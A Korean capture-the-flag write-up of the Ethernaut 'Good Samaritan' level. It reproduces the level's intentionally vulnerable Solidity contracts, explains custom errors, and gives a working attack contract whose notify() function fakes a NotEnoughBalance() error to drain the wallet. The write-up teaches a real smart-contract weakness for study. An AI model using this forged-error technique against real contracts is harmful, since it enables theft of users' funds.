https://teberr.notion.site/Ethernaut-Good-Samaritan-9064c21bcc934587a341524c7e17c4e5

![Good Samaritan.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e54bcb48-6600-4039-be47-16695d9b6492/Good_Samaritan.png)

> 이 인스턴스는 부유한 좋은 사마리아인입니다. 요청하는 누구에게나 코인을 기부하죠.

과연 당신은 지갑에서 모든 자산을 빼낼 수 있을까요?
> 
> 
> 힌트
> 
> - [Solidity Custom Errors](https://blog.soliditylang.org/2021/04/21/custom-errors/)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

# 코드 분석 및 공격 설계

인스턴스를 받아오면 상호작용 할 수 있는 컨트랙트는 Good Samaritan 컨트랙트이다. Good Samaritan 컨트랙트에서는 상호작용할 수 있는 함수가 딱 하나 존재하는데 바로 requestDonation()함수이다.

 

```solidity
    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
```

로직은 간단하다.

wallet 컨트랙트의 donate10 함수를 msg.sender(호출한 주소)를 인자로 하여 호출한다. 이 때 에러가 발생한다면 그 에러의 값이 abi.encodeWithSignature("NotEnoughBalance()")인지 확인하여 같다면 wallet의 transferRemainder 함수를 msg.sender를 인자로 하여 호출한다. 

그러면 wallet 컨트랙트의 donate10 함수와 transferRemainder 함수를 살펴보자.

```solidity
contract Wallet {
		function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }
}
```

donate10(address dest_)함수는 두 가지 분기가 있다. 

1. Wallet 컨트랙트에 있는 코인이 10개 보다 적다면 NotEnoughBalance() 에러를 발생시킨다. 우리가 원하는 에러이지만 10^6만큼 코인이 존재하므로 10이 될때 까지 계속 반복하여 실행시키기는 사실상 불가능하다.
2. Wallet 컨트랙트에 있는 코인이 10개보다 코인이 많다면 coin 컨트랙트의 transfer(dest_,10)함수를 호출한다. 즉 dest 주소로 코인을 10개 보낸다.

transferRemainder 함수는 인자로 받은 dest 주소로 이 컨트랙트에 있는 모든 코인을 전송한다.

그러면 Coin 컨트랙트의 transfer 함수를 보자.

```solidity
contract Coin {    
		function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}
```

전송할 코인의 양인 amount가 Wallet에서 전송할 만큼 충분하다면 Wallet에서 코인을 빼서 dest 주소의 코인 갯수를 늘린다. 만약 충분하지 않다면 InsufficientBalance 사용자 설정 에러를 발생시킨다.

이어서 인자로 전달받은 dest 주소가 컨트랙트라면 그 컨트랙트의 notify(amount) 함수를 호출한다.

즉 문제 인스턴스의 requestDonation()을 호출시켜서 다음과 같은 과정을 거치게 하면 된다.

1. donate10(msg.sender)을 실행하면 transfer(_dest,10)이 실행되며 err가 발생해야 한다.
2. err의 값은 abi.encodeWithSignature("NotEnoughBalance()") 여야한다.
3. 그러면 wallet.transferRemainder(msg.sender)가 실행이된다.
4. 이는 coin.transfer(dest_, coin.balances(address(this)))를 호출하여 모든 자산을 내 컨트랙트로 옮긴다.
5. 이 때는 에러가 발생하지 않고 트랜잭션이 완료되게 하여 모든 자산을 탈취하면 된다.

즉 여기서 공격을 위한 컨트랙트를 작성해야 하는데 고려해야 하는 것은 두가지이다. 

1. 사용자 에러 err을 발생시키되 그 값이  abi.encodeWithSignature("NotEnoughBalance()") 이어야 한다.
2. coin.transfer(dest,10)은 에러를, coin.transfer(dest, 전재산)은 에러를 발생시키지 않아야 한다.

사용자 에러에 대해 살펴보자.

## 사용자 에러

솔리디티 0.8.4버전 이후부터 생긴 기능으로 기존에는 require 문의 문자열을 통해서 어떤 에러가 발생하였는지를 알려주었다. 하지만 이 사용자에러는 require 문을 사용하는 방법보다 간편하고 가스를 절약할 수 있는 방법이다.

event와 비슷하게 사용한다. 예시를 들어보자.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

error Unauthorized();

contract VendingMachine {
    address payable owner = payable(msg.sender);

    function withdraw() public {
        if (msg.sender != owner)
            revert Unauthorized();

        owner.transfer(address(this).balance);
    }
    // ...
}
```

event처럼 미리 error 함수명();을 정의해두고 revert로 그 에러를 발생시키면 된다. 

그러면 이 에러데이터는 `abi.encodeWithSignature(”Unauthorized()”)`로 인코딩 되어 전달된다.

이 사용자 에러는 인자도 전달하며 사용이 가능하다.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

/// Insufficient balance for transfer. Needed `required` but only
/// `available` available.
/// @param available balance available.
/// @param required requested amount to transfer.
error InsufficientBalance(uint256 available, uint256 required);

contract TestToken {
    mapping(address => uint) balance;
    function transfer(address to, uint256 amount) public {
        if (amount > balance[msg.sender])
            // Error call using named parameters. Equivalent to
            // revert InsufficientBalance(balance[msg.sender], amount);
            revert InsufficientBalance({
                available: balance[msg.sender],
                required: amount
            });
        balance[msg.sender] -= amount;
        balance[to] += amount;
    }
    // ...
}
```

이 경우에는 에러가 발생했을 때 전달해주는 에러데이터는 `abi.encodeWithSignature("InsufficientBalance(uint256,uint256)", balance[msg.sender], amount)`

가 된다.

# 공격

정리하면 내 공격 컨트랙트는 명확해졌다.

1. 사용자 에러 err을 발생시키되 그 에러는 NotEnoughBalance() 이어야 한다.
2. coin.transfer(dest,10)은 에러를, coin.transfer(dest, 전재산)은 에러를 발생시키지 않아야 한다. 따라서 내 주소가 컨트랙트일때 transfer함수에서 실행되도록 되어있는 인터페이스인 notify(amount) 함수를 이용하여 에러를 발생시키거나 발생시키지 않을 것이다.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
interface ISamaritan{
    function requestDonation() external returns(bool enoughBalance);
}
contract GoodSamaritanAttack {

    ISamaritan public target;
    bool public enoughBalance;
    error NotEnoughBalance();
    
    constructor(address _target) {
        target=ISamaritan(_target);
    }
    function attack() public {
        enoughBalance = target.requestDonation();
    }

    function notify(uint256 amount) public{
        if(amount <=10){
            revert NotEnoughBalance();
        }
    }
}
```

Wallet 컨트랙트에 담겨있는 코인은 10^6이므로 무조건 10보다 크다. 코인 10개를 받을 때는 에러가 발생해야 하지만 Wallet에 있는 코인을 전부 받을 때에는 에러가 발생하면 안되므로 따라서 전달 받을 코인의 양인 amount 값이 10이하 일때만 notify 함수에서 에러가 발생하게 하였다.

이제 공격을 진행하면 다음과 같은 과정을 거칠 것이다.

1. 공격 컨트랙트의 attack() 함수를 실행시켜 인스턴스의 requestDonation()이 실행한다.
2. requestDonation() 에서 Wallet.donate10(msg.sender)이 실행된다. 
3. Wallet.donate10에서 coin.transfer(_dest,10)이 실행된다. _dest=내 공격 컨트랙트
4. 이때 _dest는 내 공격 컨트랙트이므로 내 공격 컨트랙트의 notify(10)함수가 실행된다.
5. amount 값이 10이므로 사용자 정의 에러인 NotEnoughBalance() 에러가 리턴된다.
6. 다시 requestDonation()으로 에러가 반환되며 이 때 err의 값은 abi.encodeWithSignature("NotEnoughBalance()") 이므로 wallet.transferRemainder(msg.sender)가 실행이된다.
7. 이는 coin.transfer(dest_, coin.balances(address(this)))를 호출하여 모든 자산을 내 컨트랙트로 옮긴다.
8. 이 때에도 dest가 컨트랙트이므로 notify(coin.balances(address(this))가 실행되지만 이 amount 값은 10보다 큰 값이기 때문에 에러가 발생하지 않고 트랜잭션이 완료되게 하여 모든 자산을 탈취하게 된다.

공격을 진행한 후 모든 코인을 탈취하는 목적을 달성하였으므로 인스턴스를 제출해주면 된다.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a3f2b07c-de91-4340-8d5a-3145ea4dcff4/%EC%84%B1%EA%B3%B5.png)

# 후기

솔리디티에서 사용자 정의 에러는 함수 call과 똑같이 4바이트 시그니쳐를 통해서 식별된다. 위 문제에서 볼 수 있듯이 try-catch 블록의 catch 문에 의해서 잡히기 전까지 체인을 통해 버블링 된다. 즉 위 문제에서의 의도는 호출한 Wallet에서 코인이 부족할 경우 발생하는 에러가 NotEnoughBalance()임을 의도했지만 공격자가 에러를 맘대로 발생시킬 수 있는 경우 동일한 시그니쳐를 갖는 에러를 선언하고 의도하지 않은 위치로 에러를 던질 수 있게 된다. 

즉 사용자 지정에러는 공격자가 똑같은 시그니쳐로 만들어서 악용할 수 있음을 유의하라는 것이다.
